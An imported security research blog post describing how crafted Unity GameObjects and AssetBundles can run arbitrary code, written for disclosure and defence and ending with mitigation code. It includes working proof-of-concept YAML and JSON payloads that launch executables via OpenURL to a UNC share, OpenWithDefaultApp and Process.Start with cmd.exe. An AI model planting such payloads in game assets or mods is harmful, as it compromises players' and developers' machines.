---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-13_hacking-unity-games-with-malicious-gameobjects.md
original_filename: 2022-09-13_hacking-unity-games-with-malicious-gameobjects.md
title: Hacking Unity Games with Malicious GameObjects
category: documents
detected_topics:
- supply-chain
- ssrf
- mobile-security
- command-injection
- mfa
- api-security
tags:
- imported
- documents
- supply-chain
- ssrf
- mobile-security
- command-injection
- mfa
- api-security
language: en
raw_sha256: c640fafc462218ba3eaadf276c59f6d2830a01991becadc4877219809250d02c
text_sha256: 3c14fb4cc04c4ade3eb8a019f856619e33cc4299c0263a92ca6db41dcd19fa61
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking Unity Games with Malicious GameObjects

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-13_hacking-unity-games-with-malicious-gameobjects.md
- Source Type: markdown
- Detected Topics: supply-chain, ssrf, mobile-security, command-injection, mfa, api-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `c640fafc462218ba3eaadf276c59f6d2830a01991becadc4877219809250d02c`
- Text SHA256: `3c14fb4cc04c4ade3eb8a019f856619e33cc4299c0263a92ca6db41dcd19fa61`


## Content

---
title: "Hacking Unity Games with Malicious GameObjects"
page_title: "Hacking Unity Games with Malicious GameObjects - Include Security Research Blog"
url: "https://blog.includesecurity.com/2021/06/hacking-unity-games-malicious-unity-game-objects/"
final_url: "https://blog.includesecurity.com/2021/06/hacking-unity-games-malicious-unity-game-objects/"
authors: ["Jason Kielpinski (@f2jason)"]
programs: ["Unity"]
bugs: ["Arbitrary code execution", "RCE"]
publication_date: "2022-09-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2174
---

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2021/02/title_image.png?fit=936%2C271&ssl=1)

# Hacking Unity Games with Malicious GameObjects

June 9, 2021June 9, 2021 — IncludeSec

At IncludeSec our clients are asking us to hack on all sorts of crazy applications from mass scale web systems to IoT devices and low-level firmware. Something that we’re seeing more of is hacking virtual reality systems and mass scale video games so we had a chance to do some research and came up with a bit of a novel approach which may allow attacking Unity-powered games and game devs.

Specifically, this post will outline:

  * Two ways I found that GameObjects (a non-code asset type) can be crafted to cause arbitrary code to run.
  * Five possible ways an attacker might use a malicious GameObject to compromise a Unity game.
  * How game developers can mitigate the risk.

Unity has also published their own [blog post](https://blog.unity.com/news/upm-dependency-confusion-assetbundle-security-in-the-editor) on this subject, they’ve been great to work with and continue to make moves internally to maximize the security of their platform. Be sure to check that post out for specific recommendations on how to protect against this sort of vulnerability.

## Terminology

First a brief primer on the terms I’m going to use for those less familiar with Unity.

  * **GameObjects** are entities in Unity that can have any number of components attached.
  * **Components** are added to GameObjects to make them do things. They include Unity built-in components, like UI elements and sprite renderers, as well as custom scripted components used to build the game logic.
  * **Assets** are the elements that make up the game. This includes images, sounds, scripts, and GameObjects, among other things.
  * **AssetBundles** are a way to package _non-code_ assets and allow them to be loaded at runtime (from the web or locally). They are used to decrease initial download size, allow downloadable content, as well as sometimes to enable modding of the game. 

## Ways a malicious GameObject could get into a game

Before going into details about how a GameObject could execute code, let’s talk about how it would get in the game in the first place so that we’re clear on the attack scenarios. I came up with five ways a malicious GameObject might find its way into a Unity game:

**Way 1:** the most obvious route is if the game developer downloaded it and added it to the game project. This might be an asset they purchased on the Unity Asset Store, or something they found on GitHub that solved a problem they were having.  
  
**Way 2** : Unity AssetBundles allow non-script assets (including GameObjects) to be imported into a game at runtime. There may be an assumption that these assets are safe, since they contain no custom script assets, but as you’ll see further into the post that is not a safe assumption. For example, sometimes AssetBundles are used to add modding functionality to a game. If that’s the case, then third-party mods downloaded by a user can unexpectedly cause code execution, similar to running untrusted programs from the internet.  
  
**Way 3** : AssetBundles can be downloaded from the internet at runtime without transport encryption enabling man-in-the-middle attacks. The [Unity documentation](https://docs.unity3d.com/ScriptReference/Networking.UnityWebRequestAssetBundle.GetAssetBundle.html) has an example of how to do this, partially listed below:
  
  
  UnityWebRequest uwr = UnityWebRequestAssetBundle.GetAssetBundle("http://www.my-server.com/mybundle")

In the Unity-provided example, the AssetBundle is being downloaded over HTTP. If an AssetBundle is downloaded over HTTP (which lacks the encryption and certificate validation of HTTPS), an attacker with a man-in-the-middle position of whoever is running the game could tamper with the AssetBundle in transit and replace it with a malicious one. This could, for example, affect players who are playing on an untrusted network such as a public WiFi access point.

**Way 4** : AssetBundles can be downloaded from the internet at runtime **_with transport encryption_** but man-in-the-middle attacks might still be possible.

Unity [has this to say](https://docs.unity3d.com/ScriptReference/Networking.UnityWebRequest-certificateHandler.html) about certificate validation when using UnityWebRequests:

> Some platforms will validate certificates against a root certificate authority store. Other platforms will simply bypass certificate validation completely.

According to the docs, even if you use HTTPS, on certain platforms Unity won’t check certificates to verify it’s communicating with the intended server, opening the door for possible AssetBundle tampering. It’s possible to [create your own certificate handler](https://docs.unity3d.com/ScriptReference/Networking.CertificateHandler.html), but only on specific platforms:

> _Note:_ Custom certificate validation is currently only implemented for the following platforms – Android, iOS, tvOS and desktop platforms.

I could not find information about which platforms “bypass certificate validation completely”, but I’m guessing it’s the less-common ones? Still, if you’re developing a game that downloads AssetBundles, you might want to verify that certificate validation is working on the platforms you use.

**Way 5** : Malicious insider. A contributor on a development team or open source project wants to add some bad code to a game. But maybe the dev team has code reviews to prevent this sort of thing. Likely, those code reviews don’t extend to the GameObjects themselves, so the attacker smuggles their code into a GameObject that gets deployed with the game.

## Crafting malicious GameObjects

I think it’s pretty obvious why you wouldn’t want arbitrary code running in your game — it might compromise players’ computers, steal their data, crash the game, etc. If the malicious code runs on a development machine, the attacker could potentially [steal the source code](https://arstechnica.com/gaming/2016/06/what-drove-one-half-life-2-super-fan-to-hack-into-valves-servers/) or pivot to attack the studio’s internal network. Peter Clemenko had [another interesting perspective](https://medium.com/@peter.clemenko/malicious-entity-injection-mei-to-do-a-laughing-man-style-attack-on-x-reality-61e93672a81a) on his blog: essentially, in the near-future augmented-reality cyberpunk ready-player-1 upcoming world an attacker may seek to inject things into a user’s reality to confuse, distract, annoy, and that might cause real-world harm.

So, how can non-script assets get code execution?

### Method 1: UnityEvents

Unity has an event system that allows hooking up delegates in code that will be called when an event is triggered. You can use them in your custom scripts for game-specific events, and they are also used on Unity’s built-in UI components (such as Buttons) for event handlers (like onClick) . Additionally, you can add ones to objects such as PointerClick, PointerEnter, Scroll, etc. using an EventTrigger component

One-parameter UnityEvents can be exposed in the inspector by components. In normal usage, setting up a UnityEvent looks like this in the Unity inspector:

![](https://lh3.googleusercontent.com/NgdCq2bFW9OSlIO7VdrZdKhARDaofchHFkLk66Qmfa6uVBRcho7cXZvUCxJP3hw2SbMWkSsrfuAAUqQMfc6uQY6WzM70LVO3jsRamU3BEeAxZ5D6BHiU9P3ZNF8Hp0qlFGbAwTtb)

First you have to assign a GameObject to receive the event callback (in this case, “Main Camera”). Then you can look through methods and properties on any components attached to that GameObject, and select a handler method.

Many assets in Unity, including scenes and GameObject prefabs, are serialized as YAML files that store the various properties of the object. Opening up the object containing the above event trigger, the YAML looks like this:
  
  
  MonoBehaviour:
  m_ObjectHideFlags: 0
  m_CorrespondingSourceObject: {fileID: 0}
  m_PrefabInstance: {fileID: 0}
  m_PrefabAsset: {fileID: 0}
  m_GameObject: {fileID: 1978173272}
  m_Enabled: 1
  m_EditorHideFlags: 0
  m_Script: {fileID: 11500000, guid: d0b148fe25e99eb48b9724523833bab1, type: 3}
  m_Name:
  m_EditorClassIdentifier:
  m_Delegates:
  - eventID: 4
  callback:
  m_PersistentCalls:
  m_Calls:
  - m_Target: {fileID: 963194228}
  m_TargetAssemblyTypeName: UnityEngine.Component, UnityEngine
  m_MethodName: SendMessage
  m_Mode: 5
  m_Arguments:
  m_ObjectArgument: {fileID: 0}
  m_ObjectArgumentAssemblyTypeName: UnityEngine.Object, UnityEngine
  m_IntArgument: 0
  m_FloatArgument: 0
  m_StringArgument: asdf
  m_BoolArgument: 0
  m_CallState: 2

The most important part is under `m_Delegates `— that’s what controls which methods are invoked when the event is triggered. I did some digging in the [Unity C# source repo](https://github.com/Unity-Technologies/UnityCsReference/blob/master/Runtime/Export/UnityEvent/UnityEvent.cs) along with some experimenting to figure out what some of these properties are. First, to summarize my findings: UnityEvents can call any method that has a return type void and takes zero or one argument of a supported type. This includes private methods, setters, and static methods. Although the UI restricts you to invoking methods available on a specific GameObject, editing the object’s YAML does not have that restriction — they can call any method in a loaded assembly . You can skip to exploitation below if you don’t need more details of how this works.

### Technical details

UnityEvents technically support delegate functions with anywhere from zero to four parameters, but unfortunately Unity does not use any UnityEvents with greater than one parameter for its built-in components (and I found no way to encode more parameters into the YAML). We are therefore limited to one-parameter functions for our attack.

The important fields in the above YAML are:

  * **eventID** — This is specific to EventTriggers (rather than UI components.) It specifies the type of event, PointerClick, PointerHover, etc. PointerClick is “4”.
  * **m_TargetAssemblyTypeName** — this is the[ fully qualified .NET type name](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/specifying-fully-qualified-type-names) that the event handler function will be called on. Essentially this takes the form: namespace.typename, assemblyname. It can be anything in one of the assemblies loaded by Unity, including all Unity engine stuff as well as a lot of .NET stuff.
  * **m_callstate** — Determines when the event triggers — only during a game, or also while using the Unity Editor:
  * 0 – `UnityEventCallState.Off`
  * 1 – `UnityEventCallState.EditorAndRuntime`
  * 2 – `UnityEventCallState.RuntimeOnly`
  * **m_mode —** Determines the argument type of the called function.
  * 0 – EventDefined
  * 1 – Void,
  * 2 – Object,
  * 3 – Int,
  * 4 – Float,
  * 5 – String,
  * 6 – Bool
  * **m_target —** Specify the Unity object instance that the method will be called on. Specifying `m_target: {fileId: 0}` allows static methods to be called.

Unity uses C# reflection to obtain the method to call based on the above. The code ultimately used to obtain the method is shown below:
  
  
  objectType.GetMethod(functionName, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static, null, argumentTypes, null);

With the binding flags provided, it’s possible to specify private or public methods, static or instance methods. When calling the function, a delegate is created with type UnityAction that has a return type of void — therefore, the specified function must have a void return type.

### Exploitation

My goal after discovering the above was to find some method available in the default loaded assemblies fitting the correct form (static, return void, exactly 1 parameter) which would let me do Bad Things™. Ideally, I wanted to get arbitrary code execution, but other things could be interesting too. If I could hook up an event handler to something dangerous, we would have a malicious GameObject.

I was quickly able to get arbitrary code execution on Windows machines by invoking `Application.OpenURL()` with a UNC path pointing to a malicious executable on a network share. The attacker would host a malicious exe file, and wait for the game client to trigger the event. OpenURL will then download and execute the payload. 

Below is the event definition I used in the object YAML:
  
  
  - m_Target: {fileID: 0}
  m_TargetAssemblyTypeName: UnityEngine.Application, UnityEngine
  m_MethodName: OpenURL
  m_Mode: 5
  m_Arguments:
  m_ObjectArgument: {fileID: 0}
  m_ObjectArgumentAssemblyTypeName: UnityEngine.Object, UnityEngine
  m_IntArgument: 0
  m_FloatArgument: 0
  m_StringArgument: file://JASON-INCLUDESE/shared/calc.exe
  m_BoolArgument: 0
  m_CallState: 2
  

It sets an OnPointerClick handler on an object with a large bounding box (to ensure it gets triggered). When the victim user clicks, it retrieves calc.exe from a network share and executes it. In a hypothetical attack the exe file would likely be on the internet, but I hosted on my local network. Here’s a gif of what happens when you click the object:

![](https://lh6.googleusercontent.com/AlQp-BzMC-YOthPoY5RFHMKsIO1WnA7XnXWcIUycqNm2er99PonYM9HC3cYe18FfqQlCwOW2Bmnv3jpvSlCUFx-U-l0jUVVRCc93fkGOM2mj2m27zITNEPqROiX1aKPfrboADQsz)

This got arbitrary code execution on Windows from a malicious GameObject either in an AssetBundle or included in the project. However, the network drive method won’t work on non-Windows platforms unless they’ve specifically mounted a share, since they don’t automatically open UNC paths. What about those platforms?

Another interesting function is `EditorUtility.OpenWithDefaultApp()`. It takes a string path to a file, and opens it up with the system’s default app for this file type. One useful part is that it takes relative paths in the project. An attacker who can get malicious executables into your project can call this function with the relative path to their executable to get them to run.

For example, on macOS I compiled the following C program which writes “hello there” to /tmp/hello:
  
  
  #include <stdio.h>;
  int main() {
  FILE* fp = fopen("/tmp/hello");
  fprintf(fp, "hello there");
  fclose(fp);
  return 0;
  }

I included the compiled binary in my Assets folder as “hello” (no extension — this is important!) Then I set up the following onClick event on a button:
  
  
  m_OnClick:
  m_PersistentCalls:
  m_Calls:
  - m_Target: {fileID: 0}
  m_TargetAssemblyTypeName: UnityEditor.EditorUtility, UnityEditor
  m_MethodName: OpenWithDefaultApp
  m_Mode: 5
  m_Arguments:
  m_ObjectArgument: {fileID: 0}
  m_ObjectArgumentAssemblyTypeName: UnityEngine.Object, UnityEngine
  m_IntArgument: 0
  m_FloatArgument: 0
  m_StringArgument: Assets/hello
  m_BoolArgument: 0
  m_CallState: 2

It now executes the executable when you click the button:

![](https://lh5.googleusercontent.com/ojkYE7G-_DCFzp6JprVv2ifLSOQGMQeGNYjRm1Bn7K3T3uJoq99FmXocPM_zUqjrS7zqMCK0A2SxwOmIipZK6enXhdk4y7zU3YZ_vA8u7gZEQUd14Fd8DM8hMX_qE17rsL5h82Je)

This doesn’t work for AssetBundles though, because the unpacked contents of AssetBundles aren’t written to disk. Although the above might be an exploitation path in some scenarios, my main goal was to get code execution from AssetBundles, so I kept looking for methods that might let me do that on Mac (on Windows, it’s possible with `OpenURL()`, as previously shown). I used the following regex in SublimeText to search over the UnityCsReference repository for any matching functions that a UnityEvent could call: `static( extern|) void [A-Za-z\w_]*\((string|int|bool|float) [A-Za-z\w_]*\)`

After pouring over the 426 discovered methods, I fell a short of getting completely arbitrary code exec from AssetBundles on non-Windows platforms — although I still think it’s probably possible. I did find a bunch of other ways such a GameObject could do Bad Things™. This is just a small sampling:

`Unity.CodeEditor.CodeEditor.SetExternalScriptEditor()`| Can change a user’s default code editor to arbitrary values. Setting it to a malicious UNC executable can achieve code execution whenever they trigger Unity to open a code editor, similar to the OpenURL exploitation path.  
---|---  
`PlayerPrefs.DeleteAll()`| Delete all save games and other stored data.  
`UnityEditor.FileUtil.UnityDirectoryDelete()`| Invokes Directory.Delete() on the specified directory.  
`UnityEngine.ScreenCapture.CaptureScreenshot()`| Takes a screenshot of the game window to a specified file. Will automatically overwrite the specified file. Can be written to UNC paths in Windows.  
`UnityEditor.PlayerSettings.SetAdditionalIl2CppArgs()`| Add flags to be passed to the Il2Cpp compiler.  
`UnityEditor.BuildPlayerWindow.BuildPlayerAndRun()`| Trigger the game to build. In my testing I couldn’t get this to work, but combined with the Il2Cpp flag function above it could be interesting.  
`Application.Quit(), EditorApplication.Exit()`| Quit out of the game/editor.  
  
## Method 2: Visual scripting systems

There are various visual scripting systems for Unity that let you create logic without code. If you have imported one of these into your project, any third-party GameObject you import can use the visual scripting system. Some of the systems are more powerful or less powerful. I will focus on Bolt as an example since it’s pretty popular, Unity acquired it, and it’s now free. 

This attack vector was proposed on Peter Clemenko’s blog I mentioned earlier, but it focused on malicious entity injection — I think it should be clarified that, using Bolt, it’s possible for imported GameObjects to achieve arbitrary code execution as well, including shell command execution.

With the default settings, Bolt does not show many of the methods available to you in the loaded assemblies in its UI. Once again, though, you have more options if you edit the YAML than you do in the UI. For example, if you make a simple Bolt flow graph like the following:

![](https://lh3.googleusercontent.com/es61mTEidKebugkzUWl-5q6EeEHIPMoWitIdDmUJ6cx3IlT0nH7oLt8Pu15SliWW3ORANNYNwByYVGB1EgjzjvfxhB5t-uOxRYEqy67nboyswyi6plai2m_z2oQV6bOqVZZ9elVf)

The YAML looks like:
  
  
  MonoBehaviour:
  m_ObjectHideFlags: 0
  m_CorrespondingSourceObject: {fileID: 0}
  m_PrefabInstance: {fileID: 0}
  m_PrefabAsset: {fileID: 0}
  m_GameObject: {fileID: 2032548220}
  m_Enabled: 1
  m_EditorHideFlags: 0
  m_Script: {fileID: -57143145, guid: a040fb66244a7f54289914d98ea4ef7d, type: 3}
  m_Name:
  m_EditorClassIdentifier:
  _data:
  _json: '{"nest":{"source":"Embed","macro":null,"embed":{"variables":{"collection":{"$content":[],"$version":"A"},"$version":"A"},"controlInputDefinitions":[],"controlOutputDefinitions":[],"valueInputDefinitions":[],"valueOutputDefinitions":[],"title":null,"summary":null,"pan":{"x":117.0,"y":-103.0},"zoom":1.0,"elements":[{"coroutine":false,"defaultValues":{},"position":{"x":-204.0,"y":-144.0},"guid":"a4dcd43b-833d-49f5-8642-b6c311cf324f","$version":"A","$type":"Bolt.Start","$id":"10"},{"chainable":false,"member":{"name":"OpenURL","parameterTypes":["System.String"],"targetType":"UnityEngine.Application","targetTypeName":"UnityEngine.Application","$version":"A"},"defaultValues":{"%url":{"$content":"https://includesecurity.com","$type":"System.String"}},"position":{"x":-59.0,"y":-145.0},"guid":"395d9bac-f1da-4173-9e4b-b19d156c9a0b","$version":"A","$type":"Bolt.InvokeMember","$id":"12"},{"sourceUnit":{"$ref":"10"},"sourceKey":"trigger","destinationUnit":{"$ref":"12"},"destinationKey":"enter","guid":"d9cae7fd-e05b-48c6-b16d-5f04b0c722a6","$type":"Bolt.ControlConnection"}],"$version":"A"}}}'
  _objectReferences: []

The `_json `field seems to be where the meat is. Un-minifying it and focusing on the important parts:
  
  
  [...]
  "member": {
  "name": "OpenURL",
  "parameterTypes": [
  "System.String"
  ],
  "targetType": "UnityEngine.Application",
  "targetTypeName": "UnityEngine.Application",
  "$version": "A"
  },
  "defaultValues": {
  "%url": {
  "$content": "https://includesecurity.com",
  "$type": "System.String"
  }
  },
  [...]

It can be changed from here to a version that runs arbitrary shell commands using `System.Diagnostics.Process.Start`:
  
  
  [...]
  {
  "chainable": false,
  "member": {
  "name": "Start",
  "parameterTypes": [
  "System.String",
  "System.String"
  ],
  "targetType": "System.Diagnostics.Process",
  "targetTypeName": "System.Diagnostics.Process",
  "$version": "A"
  },
  "defaultValues": {
  "%fileName": {
  "$content": "cmd.exe",
  "$type": "System.String"
  },
  "%arguments": {
  "$content": "/c calc.exe",
  "$type": "System.String"
  }
  },
  [...]

This is what that looks like now in Unity:

![](https://lh5.googleusercontent.com/X_BbL8UVP_NyD2oFEnbFJOLpkQfgp_j6TyCvCXJu2kzhD_nTAQWSSvg3QrC9Hn_OpENWABxAaaMH3mGDOxt2RTXVAcRY9LP1vx-1h8jbryLcdYvXD1QrdsRZsB6pRUg2DRNMRjSK)

A malicious GameObject imported into a project that uses Bolt can do anything it wants.

## How to prevent this

### Third-party assets

It’s unavoidable for many dev teams to use third-party assets in their game, be it from the asset store or an outsourced art team. Still, the dev team can spend some time scrutinizing these assets before inclusion in their game — first evaluating the asset creator’s trustworthiness before importing it into their project, then reviewing it (more or less carefully depending on how much you trust the creator). 

### AssetBundles

When downloading AssetBundles, make sure they are hosted securely with HTTPS. You should also double check that Unity validates HTTPS certificates on all platforms your game runs — do this by setting up a server with a self-signed certificate and trying to download an AssetBundle from it over HTTPS. On the Windows editor, where certificate validation is verified as working, doing this creates an error like the following and sets the `UnityWebRequest.isNetworkError` property to true:

![](https://lh4.googleusercontent.com/TsReqzfVM9Lj8x19iw-ve3pkCJktON35II_fS44B1RhDBVCxb3Fi-iPpHeCzviARzz5Bf2joqGCc-ceF50MHhmfCZjtSznL1r_fGuixsTboBjagqVJuF0uBJYAeK6rZOoho6mSpe)

If the download works with no error, then an attacker could insert their own HTTPS server in between the client and server, and inject a malicious AssetBundle. 

If Unity does not validate certificates on your platform and you are not on one of the platforms that allows for custom certificate checking, you probably have to implement your own solution — likely integrating a different HTTP client that does check certificates and/or signing the AssetBundles in some way.

When possible, don’t download AssetBundles from third-parties. This is impossible, though, if you rely on AssetBundles for modding functionality. In that case, you might try to sanitize objects you receive. I know that Bolt scripts are dangerous, as well as anything containing a UnityEvent (I’m aware of EventTriggers and various UI elements). The following code strips these dangerous components recursively from a downloaded GameObject asset before instantiating:
  
  
  private static void SanitizePrefab(GameObject prefab)
  {
  System.Type[] badComponents = new System.Type[] {
  typeof(UnityEngine.EventSystems.EventTrigger),
  typeof(Bolt.FlowMachine),
  typeof(Bolt.StateMachine),
  typeof(UnityEngine.EventSystems.UIBehaviour)
  };
  
  foreach (var componentType in badComponents) {
  foreach (var component in prefab.GetComponentsInChildren(componentType, true)) {
  DestroyImmediate(component, true);
  }
  }
  }
  
  public static Object SafeInstantiate(GameObject prefab)
  {
  SanitizePrefab(prefab);
  return Instantiate(prefab);
  }
  
  public void Load()
  {
  AssetBundle ab = AssetBundle.LoadFromFile(Path.Combine(Application.streamingAssetsPath, "evilassets"));
  
  GameObject evilGO = ab.LoadAsset<GameObject>("EvilGameObject");
  GameObject evilBolt = ab.LoadAsset<GameObject>("EvilBoltObject");
  GameObject evilUI = ab.LoadAsset<GameObject>("EvilUI");
  
  SafeInstantiate(evilGO);
  SafeInstantiate(evilBolt);
  SafeInstantiate(evilUI);
  
  ab.Unload(false);
  }

Note that we haven’t done a full audit of Unity and we pretty much expect that there are other tricks with UnityEvents, or other ways for a GameObject to get code execution. But the code above at least protects against all of the attacks outlined in this blog.

If it’s essential to allow any of these things (such as Bolt scripts) to be imported into your game from AssetBundles, it gets trickier. Most likely the developer will want to create a white list of methods Bolt is allowed to call, and then attempt to remove any methods not on the whitelist before instantiating dynamically loaded GameObjects containing Bolt scripts. The whitelist could be something like “only allow methods in the `MyCompanyName.ModStuff` namespace.” Allowing all of the UnityEngine namespace would not be good enough because of things like `Application.OpenURL`, but you could wrap anything you need in another namespace. Using a blacklist to specifically reject bad methods is not recommended, the surface area is just too large and it’s likely something important will be missed, though a combination of white list and black list may be possible with high confidence. 

In general game developers need to decide how much protection they want to add at the app layer vs. putting the risk decision in the hands of a game end-user’s own judgement on what mods to run, just like it’s on them what executables they download. That’s fair, but it might be a good idea to at least give the gamers a heads up that this could be dangerous via documentation and notifications in the UI layer. They may not expect that mods could do any harm to their computer, and might be more careful once they know.

As mentioned above, if you’d like to read more about Unity’s blog for this and their recommendations, be sure to check out their [blog post](https://blog.unity.com/news/upm-dependency-confusion-assetbundle-security-in-the-editor)!

### Share this:

  * [ Share on X (Opens in new window) X ](https://blog.includesecurity.com/2021/06/hacking-unity-games-malicious-unity-game-objects/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://blog.includesecurity.com/2021/06/hacking-unity-games-malicious-unity-game-objects/?share=facebook)
  * 

### Like this:

Like Loading…

Categories [appsec](https://blog.includesecurity.com/category/appsec/), [bolt](https://blog.includesecurity.com/category/bolt/), [C#](https://blog.includesecurity.com/category/c/), [exploits](https://blog.includesecurity.com/category/exploits/), [gamedev](https://blog.includesecurity.com/category/gamedev/), [games](https://blog.includesecurity.com/category/games/), [hacking](https://blog.includesecurity.com/category/hacking/), [unity](https://blog.includesecurity.com/category/unity/), [vulnerabilities](https://blog.includesecurity.com/category/vulnerabilities/) Tags [appsec](https://blog.includesecurity.com/tag/appsec/), [bolt](https://blog.includesecurity.com/tag/bolt/), [c#](https://blog.includesecurity.com/tag/c/), [exploits](https://blog.includesecurity.com/tag/exploits/), [gamdev](https://blog.includesecurity.com/tag/gamdev/), [games](https://blog.includesecurity.com/tag/games/), [security research](https://blog.includesecurity.com/tag/security-research/), [unity](https://blog.includesecurity.com/tag/unity/), [unity3d](https://blog.includesecurity.com/tag/unity3d/), [vulnerabilities](https://blog.includesecurity.com/tag/vulnerabilities/) Post navigation

[Hack Series: Is your Ansible Package Configuration Secure?](https://blog.includesecurity.com/2021/06/hack-series-is-your-ansible-package-configuration-secure/)

[Customizing Semgrep Rules for Flask/Django and Other Popular Web Frameworks](https://blog.includesecurity.com/2021/07/customizing-semgrep-rules-for-flask-django/)
